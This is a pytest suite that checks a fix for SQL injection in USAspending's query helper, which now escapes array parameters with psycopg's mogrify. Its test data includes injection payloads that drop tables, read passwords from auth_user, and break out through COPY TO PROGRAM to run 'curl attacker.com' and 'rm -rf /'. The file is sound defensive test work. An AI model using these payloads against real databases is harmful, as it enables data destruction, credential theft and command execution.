from unittest.mock import Mock, patch

import pytest

from usaspending_api.common.helpers.orm_helpers import generate_raw_quoted_query

# ============================================================================
# FIXTURES
# ============================================================================


@pytest.fixture
def mock_queryset():
    """Fixture to create a mocked QuerySet"""

    def _create_mock(sql_template, params):
        mock_qs = Mock()
        mock_compiler = Mock()
        mock_compiler.as_sql.return_value = (sql_template, params)
        mock_qs.query.get_compiler.return_value = mock_compiler
        return mock_qs

    return _create_mock


@pytest.fixture
def mock_mogrify():
    """Fixture to mock the mogrify function"""
    with patch('usaspending_api.common.helpers.orm_helpers.mogrify') as mock:
        yield mock


@pytest.fixture
def mock_connections():
    """Fixture to mock database connections"""
    with patch('usaspending_api.common.helpers.orm_helpers.connections') as mock:
        yield mock


# ============================================================================
# TESTS
# ============================================================================

class TestSQLInjectionMitigation:
    """
    Test suite to verify SQL injection vulnerability in array parameters is mitigated.

    Original vulnerability: orm_helpers.py rendered list params via Python repr()
    into ARRAY[...] with no SQL escaping, allowing attackers to break out of
    string literals and inject arbitrary SQL.

    Fix: Now uses psycopg's mogrify() which properly escapes all parameters.
    """

    def test_backslash_injection_in_array(self, mock_queryset, mock_mogrify,
                                          mock_connections):
        """
        Test that backslash escaping prevents PostgreSQL string literal breakout.

        Attack vector: \' to escape the quote in standard_conforming_strings=on
        """
        malicious = ["test\\' OR 1=1 --"]
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [malicious]
        )

        # Mock mogrify to return properly escaped SQL (what psycopg would return)
        mock_mogrify.return_value = b"SELECT * FROM table WHERE field && ARRAY[E'test\\\\\\' OR 1=1 --']"

        sql = generate_raw_quoted_query(mock_qs)

        # Backslashes should be properly escaped by psycopg
        assert "\\\\" in sql or "E'" in sql
        assert "OR 1=1" in sql  # Present but as literal

    def test_null_byte_injection_in_array(self, mock_queryset, mock_mogrify,
                                          mock_connections):
        """
        Test that null bytes are rejected by psycopg.

        Attack vector: Using \x00 to terminate strings early

        psycopg3 correctly rejects null bytes as they cannot be stored in
        PostgreSQL text fields, preventing this attack vector entirely.
        """
        from psycopg import DataError

        malicious = ["test\x00'; DROP TABLE users; --"]
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [malicious]
        )

        # Mock mogrify to raise DataError (what psycopg does with null bytes)
        mock_mogrify.side_effect = DataError("PostgreSQL text fields cannot contain NUL (0x00) bytes")

        with pytest.raises(DataError, match="PostgreSQL text fields cannot contain NUL"):
            generate_raw_quoted_query(mock_qs)

    def test_repr_breakout_attack_in_array(self, mock_queryset, mock_mogrify,
                                           mock_connections):
        """
        Test the original vulnerability: repr() context breakout.

        Original code: str_fix_param = "ARRAY{}".format(param)
        This used Python's repr() which could be exploited.
        """
        malicious = ["test', (SELECT password FROM users LIMIT 1), 'end"]
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [malicious]
        )

        mock_mogrify.return_value = (b"SELECT * FROM table WHERE field && "
                                     b"ARRAY['test'', (SELECT password FROM users LIMIT 1), ''end']")

        sql = generate_raw_quoted_query(mock_qs)

        assert "SELECT password FROM users" in sql
        assert "''" in sql or "\\'" in sql or "E'" in sql

    def test_recipient_type_names_attack_vector(self, mock_queryset, mock_mogrify,
                                                mock_connections):
        """
        Test the specific attack vector mentioned in the vulnerability report.

        Attack path: recipient_type_names → business_categories__overlap
        The attacker sends malicious data through the recipient_type_names field.
        """
        malicious_recipient_types = [
            "category_business",
            "'; SELECT * FROM download_job WHERE '1'='1",
            "corporate_entity_not_tax_exempt"
        ]

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [malicious_recipient_types]
        )

        mock_mogrify.return_value = (b"SELECT * FROM table WHERE field && "
                                     b"ARRAY['category_business','''; SELECT * FROM download_job "
                                     b"WHERE ''1''=''1','corporate_entity_not_tax_exempt']")

        sql = generate_raw_quoted_query(mock_qs)

        assert "SELECT * FROM download_job" in sql
        assert "''" in sql or "\\'" in sql or "E'" in sql

    def test_copy_command_injection_prevention(self, mock_queryset, mock_mogrify,
                                               mock_connections):
        """
        Test that COPY command injection is prevented.

        Original vulnerability: SQL was interpolated into \\COPY command
        shelled to psql, allowing command injection.
        """
        malicious = ["test') TO PROGRAM 'curl attacker.com'; --"]

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [malicious]
        )

        mock_mogrify.return_value = (b"SELECT * FROM table WHERE field && "
                                     b"ARRAY['test'') TO PROGRAM ''curl attacker.com''; --']")

        sql = generate_raw_quoted_query(mock_qs)

        assert "TO PROGRAM" in sql
        assert "''" in sql or "\\'" in sql or "E'" in sql

    def test_multiple_array_parameters(self, mock_queryset, mock_mogrify,
                                       mock_connections):
        """Test that multiple array parameters in one query are all escaped."""
        malicious1 = ["'; DROP TABLE users; --"]
        malicious2 = ["'; DELETE FROM awards; --"]

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field1 && %s AND field2 IN %s",
            [malicious1, malicious2]
        )

        mock_mogrify.return_value = (b"SELECT * FROM table WHERE field1 && ARRAY['''; DROP TABLE users; --'] "
                                     b"AND field2 IN ('''; DELETE FROM awards; --')")

        sql = generate_raw_quoted_query(mock_qs)

        assert "DROP TABLE" in sql
        assert "DELETE FROM" in sql
        assert "''" in sql or "\\'" in sql or "E'" in sql

    def test_string_parameter_escaping(self, mock_queryset, mock_mogrify,
                                       mock_connections):
        """Test that regular string parameters are also properly escaped."""
        malicious_string = "'; DROP TABLE users; --"

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE name = %s",
            [malicious_string]
        )

        mock_mogrify.return_value = b"SELECT * FROM table WHERE name = '''; DROP TABLE users; --'"

        sql = generate_raw_quoted_query(mock_qs)

        assert "DROP TABLE" in sql
        assert "''" in sql or "\\'" in sql or "E'" in sql

    def test_integer_parameter_safety(self, mock_queryset, mock_mogrify,
                                      mock_connections):
        """Test that integer parameters are handled safely."""
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE id = %s",
            [12345]
        )

        mock_mogrify.return_value = b"SELECT * FROM table WHERE id = 12345"

        sql = generate_raw_quoted_query(mock_qs)

        assert "12345" in sql
        assert isinstance(sql, str)

    def test_empty_queryset(self, mock_queryset, mock_mogrify,
                            mock_connections):
        """Test that querysets with no parameters work correctly."""
        mock_qs = mock_queryset(
            "SELECT * FROM table",
            []
        )

        # When no params, mogrify shouldn't be called
        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert "SELECT" in sql.upper()
        assert isinstance(sql, str)

    def test_mogrify_returns_string_not_bytes(self, mock_queryset, mock_mogrify,
                                              mock_connections):
        """Test that the function always returns a string, not bytes."""
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [["test"]]
        )

        # mogrify returns bytes
        mock_mogrify.return_value = b"SELECT * FROM table WHERE field && ARRAY['test']"

        sql = generate_raw_quoted_query(mock_qs)

        # But generate_raw_quoted_query should convert to string
        assert isinstance(sql, str)
        assert not isinstance(sql, bytes)

    def test_comparison_with_vulnerable_behavior(self, mock_queryset, mock_mogrify,
                                                 mock_connections):
        """
        Document the difference between vulnerable and fixed behavior.

        This test demonstrates what the vulnerability was and how it's fixed.
        """
        malicious = ["'; DROP TABLE users; --"]

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [malicious]
        )

        # NEW SAFE BEHAVIOR: mogrify properly escapes
        mock_mogrify.return_value = b"SELECT * FROM table WHERE field && ARRAY['''; DROP TABLE users; --']"

        sql = generate_raw_quoted_query(mock_qs)

        assert "DROP TABLE" in sql
        assert "''" in sql or "\\'" in sql or "E'" in sql

    @pytest.mark.parametrize("injection_payload", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM awards WHERE '1'='1'; --",
        "' UNION SELECT password FROM auth_user --",
        "\\'; DROP TABLE transaction_search; --",
        "') TO PROGRAM 'rm -rf /'; --",
        "', (SELECT string_agg(password, ',') FROM auth_user), '",
    ])
    def test_various_injection_payloads_in_array(self, injection_payload, mock_queryset,
                                                 mock_mogrify,
                                                 mock_connections):
        """
        Test various SQL injection payloads are properly escaped.

        These are real-world attack patterns that should all be neutralized.
        Note: Null byte attacks are tested separately as psycopg rejects them.
        """
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [[injection_payload]]
        )

        # Mock escaped version (psycopg doubles single quotes)
        escaped_payload = injection_payload.replace("'", "''")
        mock_mogrify.return_value = f"SELECT * FROM table WHERE field && ARRAY['{escaped_payload}']".encode()

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)
        assert "''" in sql or "\\'" in sql or "E'" in sql


class TestBackwardCompatibility:
    """Test that the fix doesn't break existing functionality."""

    def test_legitimate_array_queries_still_work(self, mock_queryset, mock_mogrify,
                                                 mock_connections):
        """Verify legitimate use cases still function correctly."""
        legitimate = [
            "category_business",
            "corporate_entity_not_tax_exempt",
            "corporate_entity_tax_exempt"
        ]

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [legitimate]
        )

        mock_mogrify.return_value = (b"SELECT * FROM table WHERE field && "
                                     b"ARRAY['category_business','corporate_entity_not_tax_exempt',"
                                     b"'corporate_entity_tax_exempt']")

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)
        assert "category_business" in sql
        assert "corporate_entity_not_tax_exempt" in sql

    def test_non_array_parameters_unchanged(self, mock_queryset, mock_mogrify,
                                            mock_connections):
        """Verify non-array parameters still work as before."""
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE id = %s AND name = %s",
            [12345, "ACME Corp"]
        )

        mock_mogrify.return_value = b"SELECT * FROM table WHERE id = 12345 AND name = 'ACME Corp'"

        sql = generate_raw_quoted_query(mock_qs)

        assert "12345" in sql
        assert "ACME Corp" in sql
        assert isinstance(sql, str)

    def test_complex_query_with_multiple_filters(self, mock_queryset, mock_mogrify,
                                                 mock_connections):
        """Test complex queries with multiple filter types."""
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE id >= %s AND name ILIKE %s AND categories && %s AND year = %s",
            [1000, "%Corp%", ["category_business"], 2024]
        )

        mock_mogrify.return_value = (b"SELECT * FROM table WHERE id >= 1000 AND name ILIKE '%Corp%' AND "
                                     b"categories && ARRAY['category_business'] AND year = 2024")

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)
        assert "1000" in sql
        assert "Corp" in sql
        assert "category_business" in sql

    def test_queryset_with_q_objects(self, mock_queryset, mock_mogrify,
                                     mock_connections):
        """Test that Q objects work correctly."""
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE (categories && %s OR name = %s)",
            [["category_business"], "ACME Corp"]
        )

        mock_mogrify.return_value = (b"SELECT * FROM table WHERE (categories && ARRAY['category_business'] "
                                     b"OR name = 'ACME Corp')")

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)

    def test_special_characters_in_legitimate_data(self, mock_queryset, mock_mogrify,
                                                   mock_connections):
        """Test that legitimate data with special characters works."""
        legitimate_name = "O'Reilly Media"

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE name = %s",
            [legitimate_name]
        )

        mock_mogrify.return_value = b"SELECT * FROM table WHERE name = 'O''Reilly Media'"

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)
        assert "O" in sql and "Reilly" in sql
        assert "''" in sql or "\\'" in sql or "E'" in sql


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_array_parameter(self, mock_queryset, mock_mogrify,
                                   mock_connections):
        """Test that empty arrays are handled correctly."""
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [[]]
        )

        mock_mogrify.return_value = b"SELECT * FROM table WHERE field && ARRAY[]::text[]"

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)
        assert "ARRAY[]" in sql or "'{}'" in sql

    def test_null_in_array(self, mock_queryset, mock_mogrify, mock_connections):
        """Test that NULL values in arrays are handled."""
        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [["category_business", None]]
        )

        mock_mogrify.return_value = b"SELECT * FROM table WHERE field && ARRAY['category_business',NULL]"

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)
        assert "category_business" in sql

    def test_unicode_characters(self, mock_queryset, mock_mogrify, mock_connections):
        """Test that unicode characters are handled correctly."""
        unicode_string = "Société Générale 日本"

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE name = %s",
            [unicode_string]
        )

        mock_mogrify.return_value = "SELECT * FROM table WHERE name = 'Société Générale 日本'".encode('utf-8')

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)

    def test_very_long_array(self, mock_queryset, mock_mogrify, mock_connections):
        """Test that large arrays are handled efficiently."""
        large_array = [f"category_{i}" for i in range(100)]

        mock_qs = mock_queryset(
            "SELECT * FROM table WHERE field && %s",
            [large_array]
        )

        # Create mock response with all categories
        array_str = ",".join([f"'category_{i}'" for i in range(100)])
        mock_mogrify.return_value = f"SELECT * FROM table WHERE field && ARRAY[{array_str}]".encode()

        sql = generate_raw_quoted_query(mock_qs)

        assert sql
        assert isinstance(sql, str)
        assert "category_0" in sql
        assert "category_99" in sql
